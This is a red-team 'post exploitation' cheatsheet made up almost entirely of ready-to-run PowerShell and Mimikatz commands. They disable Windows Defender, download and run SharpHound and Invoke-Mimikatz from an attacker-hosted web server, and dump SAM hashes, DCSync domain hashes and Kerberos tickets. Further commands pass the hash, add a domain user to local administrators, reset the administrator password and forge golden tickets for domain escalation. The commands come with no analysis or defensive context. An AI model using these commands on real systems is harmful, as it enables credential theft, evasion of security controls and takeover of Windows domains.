---
id: 09b5daa0-8831-465f-b5d4-67a9f818c995
name: Red Team Post Exploitation
type: cheatsheet
verified: false
created_at: '2020-07-15T19:05:44.670229+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Red Team Post Exploitation

# Description

Red Team Cheatsheet to perform Exploitation with powershell

**Command** ([[Disable AV and AMSI]]):

```bash
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true

```

**Command** ([[Download and run Bloodhound ingestor on machine]]):

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All

```

**Command** ([[Download and run Mimikatz dumpcreds]]):

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds

```

**Command** ([[Dump SAM hashes using mimikatz]]):

```bash
Invoke-Mimikatz -Command '"privilege:debug" "token::elevate" "lsadump::sam" "exit"'

```

**Command** ([[Perform a DCSync attack and dump all hashes in the Domain using mimikatz]]):

```bash
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /all /csv"'

```

**Command** ([[Dump all tickets using mimiktaz]]):

```bash
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"'

```

**Command** ([[Pass the dumped ticket using mimikatz]]):

```bash
Invoke-Command -Session $sess -ScriptBlock { Invoke-Mimikatz -Command '"privilege::debug" "kerberos::ptt ticket.kirbi" "exit"' }

```

**Command** ([[Execute command as user using the dumped hash]]):

```bash
Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command "net localgroup administrators evil\elliot /add"

```

**Command** ([[Create a Nested PS Session and disable AV]]):

```bash
$sess = New-PSSession -ComputerName MS01 -Credential evil\elliot
Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true }

```

**Command** ([[Reset password of AD Account]]):

```bash
Set-ADAccountPassword -Identity administrator -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password1" -Force)

```

**Command** ([[Pass the Hash using mimikatz]]):

```bash
sekurlsa::pth /user:itstaff /domain:evilcorp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

```

**Command** ([[Child domain to Parent domain lateral movement]]):

```bash
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /sids:S-1-5-21-493355955-4215530352-779396340-519 /ptt

```

**Command** ([[Create a Golden Ticket using krbtgt hash]]):

```bash
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-258778211-3859232159-551458613 /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /ptt
misc::cmd

```
